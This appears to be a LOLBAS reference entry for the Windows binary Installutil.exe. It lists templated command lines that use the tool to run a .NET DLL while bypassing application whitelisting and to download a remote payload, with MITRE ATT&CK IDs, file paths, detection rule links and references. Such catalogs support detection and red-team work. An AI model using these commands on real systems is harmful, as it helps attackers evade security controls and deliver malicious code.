---
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
- Person: Nir Chako (Pente
Author: Oddvar Moe
Commands:
- Category: AWL Bypass
  Command: InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
  Description: Execute the target .NET DLL or EXE.
  MitreID: T1218.004
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: DLL (.NET)
  - Execute: EXE (.NET)
  Usecase: Use to execute code and bypass application whitelisting
- Category: Execute
  Command: InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
  Description: Execute the target .NET DLL or EXE.
  MitreID: T1218.004
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: DLL (.NET)
  - Execute: EXE (.NET)
  Usecase: Use to execute code and bypass application whitelisting
- Category: Download
  Command: InstallUtil.exe {REMOTEURL}
  Description: It will download a remote payload and place it in INetCache.
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Downloads payload from remote server
Created: 2018-05-25
Description: The Installer tool is a command-line utility that allows you to install
  and uninstall server resources by executing the installer components in specified
  assemblies
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_instalutil_no_log_execution.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_installutil_download.yml
- Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
Full_Path:
- Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe
- Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
Name: Installutil.exe
Resources:
- Link: https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
- Link: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12
- Link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md
- Link: https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/
- Link: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
- Link: https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool
mitre_data:
  technique_ids:
  - T1218.004
  - T1105
tags:
- lolbas/osbinaries
---

# Installutil.exe

The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies

# Path(s)

- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`

# Download Commands

It will download a remote payload and place it in INetCache.

```batch
InstallUtil.exe {REMOTEURL}
```

- **Usecase:** Downloads payload from remote server
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# AWL Bypass Commands

Execute the target .NET DLL or EXE.

```batch
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
```

- **Usecase:** Use to execute code and bypass application whitelisting
- **Privileges Required:** User
- **MitreID:** `T1218.004`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Execute Commands

Execute the target .NET DLL or EXE.

```batch
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
```

- **Usecase:** Use to execute code and bypass application whitelisting
- **Privileges Required:** User
- **MitreID:** `T1218.004`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Resource(s)

- https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
- https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12
- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md
- https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/
- https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
- https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Casey Smith (@subtee)
- Nir Chako (Pente